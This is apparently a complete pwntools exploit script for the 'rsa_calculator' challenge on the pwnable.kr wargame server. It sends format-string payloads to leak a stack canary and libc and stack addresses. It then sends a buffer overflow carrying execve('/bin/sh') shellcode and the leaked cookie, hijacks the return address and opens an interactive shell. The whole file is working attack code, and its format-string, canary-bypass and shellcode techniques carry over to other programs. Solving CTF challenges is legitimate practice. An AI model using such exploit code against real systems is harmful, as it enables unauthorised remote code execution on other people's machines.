from pwn import *

#p = process('./rsa_calculator')
p = remote('pwnable.kr',9012)

#gdb.attach(p,'''
#break *0x401250
#''')

p.sendline("1")
p.sendline("16")
p.sendline("16")
p.sendline("256")
p.sendline("1")
p.sendline("3")
p.sendline("128")

p.sendline("25252525323232323030303035353535242424246c6c6c6c6c6c6c6c787878785f5f5f5f252525253333333334343434242424246c6c6c6c6c6c6c6c78787878")

p.sendline("3")
p.sendline("64")
p.sendline("5f5f5f5f252525253434343436363636242424246c6c6c6c6c6c6c6c78787878")

print p.recvuntil("result -\n")

cookie = int(p.recvuntil("_")[:-1], 16)
address = int(p.recvline(), 16) + 0x30
p.recvuntil("_")
libc = int(p.recvline(), 16)
shell = libc + 1355635

print "COOKIE: {0:x}".format(cookie)
print "ADDRESS: {0:x}".format(address)
print "LIBC: {0:x}".format(libc)
print "SHELL: {0:x}".format(shell)
print "BASE: {0:x}".format(address + 1312)

#shellcode = "\x48\xbf" + p64(shell) + "\x90" * 8 + "\x6a\x3b\x58\x0f\x05"
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.sendline("3")
p.sendline("-1")
p.sendline("A" * 240 + shellcode + "\x90" * 16 + "A" * 1265 + p64(cookie) + p64(address + 1312) + p64(address))

p.interactive()